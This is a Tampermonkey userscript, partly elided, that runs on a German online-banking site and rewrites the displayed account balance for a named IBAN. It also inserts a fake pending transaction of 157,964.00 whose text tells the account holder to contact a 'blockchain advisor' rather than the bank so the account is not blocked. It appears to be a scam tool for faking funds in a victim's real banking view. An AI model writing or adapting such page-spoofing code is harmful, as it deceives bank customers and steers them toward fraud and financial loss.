// ==UserScript==
// @name         Ed Rec Volks combined Peter Heier
// @namespace    http://tampermonkey.net/
// @version      0.7
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.meinebank.de/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487411/Ed%20Rec%20Volks%20combined%20Peter%20Heier.user.js
// @updateURL https://update.greasyfork.org/scripts/487411/Ed%20Rec%20Volks%20combined%20Peter%20Heier.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE09 5006 1741";
    var targetTextContent2 = " 0000 2894 77";
    ...
    const TRANSACTIONS = [
        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Blockchain Berater A. Gold, nicht die Bank, damit nicht gesperrt wird.',
            amount: '157.964,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
